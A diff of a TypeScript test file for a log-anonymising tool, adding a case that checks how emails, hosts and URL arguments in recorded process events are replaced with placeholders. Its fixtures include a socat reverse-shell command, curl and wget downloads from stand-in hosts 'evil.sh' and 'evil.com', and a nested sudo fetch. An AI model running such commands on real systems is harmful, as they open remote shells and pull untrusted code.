@@ -1998,7 +1998,7 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
       esCreate(zsh, { path: '/Library/Frameworks/X.framework/Versions/10.0.0.5/X' }, 4),
       run(1123, '/sbin/ping', ['ping', '8.8.8.8'], '/', 5),
       run(1124, '/usr/bin/curl', ['curl', '-A', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/110.0.0.0', '-o', '/dev/null', 'evil.example.net'], '/', 6),
-      run(1125, '/bin/sh', ['sh', '-c', 'date +%H:%M:%S; echo 10:30:00 v10.0.0.1'], '/', 7),
+      run(1125, '/bin/sh', ['sh', '-c', 'date +%H:%M:%S; echo 10:30:00 110.0.0.1 1.10.0.0.5'], '/', 7),
     ].join('\n') + '\n';
     const r = runClean(['clean', '-o', '-'], { input });
     expect(r.status, r.stderr).toBe(0);
@@ -2013,7 +2013,7 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
     expect(ev[3]!.event.create.destination.existing_file.path).toBe('/Library/Frameworks/X.framework/Versions/10.0.0.5/X');
     expect(ev[4]!.event.exec.args).toEqual(['ping', '8.8.8.8']);
     expect(ev[5]!.event.exec.args).toEqual(['curl', '-A', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/110.0.0.0', '-o', '/dev/null', 'evil.example.net']);
-    expect(ev[6]!.event.exec.args[2]).toBe('date +%H:%M:%S; echo 10:30:00 v10.0.0.1');
+    expect(ev[6]!.event.exec.args[2]).toBe('date +%H:%M:%S; echo 10:30:00 110.0.0.1 1.10.0.0.5');
     expect(r.out).not.toMatch(/user:pw|Board|drop/);
     // The user info is a credential: removed and counted, never in the key.
     expect(r.summary['redacted']).toBe('2');
@@ -2090,5 +2090,47 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
     expect(events(second.out)[0]!.event.exec.args).toEqual(['ssh', 'host1.internal.invalid', 'echo person1@example.invalid']);
     expect(second.summary['placeholders host']).toBe('0');
     expect(second.summary['placeholders email']).toBe('0');
+  });
+
+  test('emails under a country domain, addresses after a colon, and URL arguments in shell code are cleaned like elsewhere', () => {
+    const input = [
+      run(1150, '/bin/echo', ['echo', 'jan.kowalski@firma.pl', 'jane.doe@acme.com:hunter2'], '/', 1, [...JDOE_ENV, 'EMAIL=jan.kowalski@firma.pl']),
+      run(1151, '/usr/bin/ssh', ['ssh', '-L', '8080:10.0.0.5:80', 'jump'], '/', 2),
+      run(1152, '/usr/bin/socat', ['socat', 'TCP:10.0.0.6:4444', 'EXEC:/bin/sh'], '/', 3),
+      run(1153, '/usr/bin/curl', ['curl', '--resolve', 'h:443:10.0.0.7', '-o', '/dev/null', 'https://h/'], '/', 4),
+      run(1154, '/usr/local/bin/mysql', ['mysql', '-h10.0.0.8'], '/', 5),
+      // Only an ssh host, or a host: form in an ssh-family or git command, is a login; an address after it is an email.
+      run(1155, '/bin/sh', ['sh', '-c', 'ssh -p 22 admin@buildbox mail jane.doe@acme.com; scp f deploy@buildbox:/srv/; git clone git@git.example.com:team/r.git'], '/', 6),
+      // A URL argument in shell code under a home cwd is the same as in the child that runs it.
+      run(1156, '/bin/sh', ['sh', '-c', 'curl evil.sh; wget evil.sh/a; curl evil.com/tmp/b'], docs, 7),
+      run(1157, '/usr/bin/curl', ['curl', 'evil.sh'], docs, 8),
+      run(1158, '/usr/local/bin/wget', ['wget', 'evil.sh/a'], docs, 9),
+      run(1159, '/usr/bin/curl', ['curl', 'evil.com/tmp/b'], docs, 10),
+      // Shell code inside a quoted string: do shell script, a nested sh -c.
+      run(1160, '/usr/bin/osascript', ['osascript', '-e', 'do shell script "curl intranet/a.sh -o /tmp/x"'], '/', 11),
+      run(1161, '/bin/sh', ['sh', '-c', "sudo sh -c 'curl evil.sh; wget intranet/c' && curl evil.sh/d"], docs, 12),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const ev = events(r.out);
+    const args = ev.map(e => e.event.exec.args as string[]);
+    const h = keyed(r.key, 'host');
+    const n = keyed(r.key, 'name');
+    expect(args[0]).toEqual(['echo', 'person1@example.invalid', 'person2@example.invalid:hunter2']);
+    expect(ev[0]!.event.exec.env).toContain('EMAIL=person1@example.invalid');
+    expect(args[1]).toEqual(['ssh', '-L', `8080:${h.get('10.0.0.5')}:80`, h.get('jump')]);
+    expect(args[2]).toEqual(['socat', `TCP:${h.get('10.0.0.6')}:4444`, 'EXEC:/bin/sh']);
+    expect(args[3]).toEqual(['curl', '--resolve', `h:443:${h.get('10.0.0.7')}`, '-o', '/dev/null', `https://${h.get('h')}/`]);
+    expect(args[4]).toEqual(['mysql', `-h${h.get('10.0.0.8')}`]);
+    expect(args[5]![2]).toBe(`ssh -p 22 admin@${h.get('buildbox')} mail person2@example.invalid; scp f deploy@${h.get('buildbox')}:/srv/; git clone git@git.example.com:team/r.git`);
+    expect(args[6]![2]).toBe(`curl evil.sh; wget evil.sh/${n.get('a')}; curl evil.com/tmp/${n.get('b')}`);
+    expect(args.slice(7, 10)).toEqual([['curl', 'evil.sh'], ['wget', `evil.sh/${n.get('a')}`], ['curl', `evil.com/tmp/${n.get('b')}`]]);
+    expect(args[10]![2]).toBe(`do shell script "curl ${h.get('intranet')}/${n.get('a.sh')} -o /tmp/${n.get('x')}"`);
+    expect(args[11]![2]).toBe(`sudo sh -c 'curl evil.sh; wget ${h.get('intranet')}/${n.get('c')}' && curl evil.sh/${n.get('d')}`);
+    expect(n.has('evil.sh')).toBe(false);
+    // No placeholder is cleaned a second time.
+    for (const k of parseKey(r.key)) expect(k.real, k.placeholder).not.toMatch(/^(?:name|host|data)\d+|internal\.invalid|example\.invalid/);
+    expect(r.out).not.toMatch(/kowalski|firma|jane|acme|10\.0\.0|intranet/);
+    sameFindings(input, r.out);
   });
 });
